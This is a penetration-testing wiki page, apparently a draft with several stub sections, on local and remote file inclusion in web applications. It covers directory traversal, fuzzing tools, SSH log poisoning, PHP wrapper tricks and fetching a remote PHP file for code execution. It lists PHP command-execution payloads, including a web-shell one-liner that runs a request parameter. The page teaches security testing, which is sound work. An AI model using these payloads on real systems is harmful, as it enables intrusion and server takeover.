# 🛠️ File inclusion

## Theory

Many web applications manage files and use server-side scripts to include them. When input parameters \(cookies, GET or POST parameters\) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to file inclusion.

LFI/RFI \(Local/Remote File Inclusion\) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE \(Remote Code Execution\) or to client-side attacks such as XSS \(Cross-Site Scripting\).

[Directory traversal](directory-traversal.md) \(a.k.a. path traversal, directory climbing, backtracking, the dot dot slash attack\) attacks allow attackers to access sensitive files on the file system, outside the web server directory. File inclusion attacks can leverage a directory traversal vulnerability to include files with a relative path.

## Practice

Testers need to identify input vectors \(parts of the app that accept content from the users\) that could be used for file related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.

* **Local File Inclusion** : inclusion of a local file \(in the web server directory\) using an absolute path
* **LFI + directory traversal** : inclusion of a local file \(in the web server directory or not\) by "climbing" the server tree with `../` \(relative path\)
* **Remote File Inclusion** : inclusion of a remote file \(not on the server\) using an URI

The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) \(Perl\) can help finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.

```bash
# With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)
dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/passwd

# Generate a wordlist in STDOUT that can be used by other fuzzers (ffuf, gobuster...)
dotdotpwn -m stdout -d 5
```

The tool [kadimus](https://github.com/P0cL4bs/Kadimus) \(C\) can help finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.

```bash
kadimus --user-agent "PENTEST" -u '$URL/?parameter=value'
```

Depending on the environment, file inclusions can sometimes lead to RCE \(Remote Code Execution\) by including a local file containing code previously injected by the attacker or a remote file containing code that the server can execute.

Local file inclusions can sometimes be combined with other vulnerabilities to achieve code execution

* directory traversal
* null-byte injection
* unrestricted file upload
* log poisoning

### 🛠️ LFI to RCE \(via logs poisoning\)

For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
ssh '<?php phpinfo(); ?>'@$TARGET
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```

🛠️ Introduce other examples, like apache session logs

* /var/log/apache/access.log
* /var/log/apache/error.log
* /var/log/httpd-access.log
* /var/log/vsftpd.log
* /var/log/sshd.log
* /var/log/mail

### 🛠️ LFI to RCE \(via phpinfo\)

### 🛠️ LFI to RCE \(via file upload\)

### 🛠️ LFI to RCE \(via php wrappers\)

//note : not sure we can achieve RCE with wrapper, we can however leak local file content \(i.e. source code\)

* php://file
* php://filter
* php://input
* expect://
* data://text/plain;base64,command

### 🛠️ LFI to RCE \(via /proc\)

* /proc/self/environ
* /proc/self/fd

### 🛠️ LFI to RCE \(via php session\)

🛠️ Introduce php wrappers

PHP wrappers can be combined with a [file upload](unrestricted-file-upload.md) to achieve RCE.

1. Upload a `.zip` file containing a PHP code execution script \(`rce.php`\)
2. Trigger the code execution by requesting `http://some.website/?page=zip://path/to/file.zip%23rce.php`.

### RFI to RCE

The tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the phpinfo in the response.

{% hint style="warning" %}
If the the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
{% endhint %}

```bash
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'
```

If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute code with one of the following payloads.

{% hint style="info" %}
As code execution functions can be filtered, the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted.
{% endhint %}

```php
<?php system('whoami'); ?>
<?php exec('whoami'); ?>
<?php passthru('whoami'); ?>
<?php shell_exec('whoami'); ?>
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

## References

{% embed url="https://www.acunetix.com/websitesecurity/directory-traversal" caption="" %}

{% embed url="https://portswigger.net/web-security/file-path-traversal" caption="" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/05-Authorization\_Testing/01-Testing\_Directory\_Traversal\_File\_Include.html" caption="Directory traversal and File Include" %}

{% embed url="https://owasp.org/www-community/attacks/Path\_Traversal" caption="Testing for Directory traversal" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.2-Testing\_for\_Remote\_File\_Inclusion.html" caption="Testing for Remote File Inclusion" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion.html" caption="Testing for Local File Inclusion" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" caption="" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" caption="" %}

